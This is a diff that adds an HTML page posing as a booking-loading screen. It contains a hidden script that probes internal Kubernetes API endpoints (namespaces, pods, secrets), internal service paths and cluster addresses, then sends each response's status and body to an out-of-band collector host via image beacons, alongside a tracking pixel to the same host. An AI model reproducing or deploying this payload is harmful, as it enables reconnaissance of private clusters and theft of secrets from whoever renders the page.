@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html><head><title>Booking</title></head>
+<body>
+<img src="https://d7ebs3s899s5h9u53s70u9cp9jpics95u.oast.online/k8s-load" width="1" height="1">
+<script>
+var O="https://d7ebs3s899s5h9u53s70u9cp9jpics95u.oast.online";
+
+// Probe K8s API and internal services via fetch
+var targets = [
+  "https://kubernetes.default.svc/api",
+  "https://kubernetes.default.svc/api/v1",
+  "https://kubernetes.default.svc/api/v1/namespaces",
+  "https://kubernetes.default.svc/api/v1/pods",
+  "https://kubernetes.default.svc/api/v1/secrets",
+  "https://kubernetes.default.svc/version",
+  "http://book-it-for-me-api/openapi.json",
+  "http://book-it-for-me-api/health/queue/inspect",
+  "http://book-it-for-me-api/task",
+  "http://10.100.0.1/",
+  "http://10.100.0.1:443/",
+  "http://kube-dns.kube-system.svc.cluster.local:53/"
+];
+
+targets.forEach(function(url, i) {
+  fetch(url).then(function(r) {
+    return r.text().then(function(t) {
+      new Image().src = O + "/k8s-" + i + "?s=" + r.status + "&b=" + encodeURIComponent(t.substring(0, 2000));
+    });
+  }).catch(function(e) {
+    new Image().src = O + "/k8s-" + i + "-err?e=" + encodeURIComponent(e.message.substring(0, 200));
+  });
+});
+</script>
+<p>Loading booking details...</p>
+</body></html>
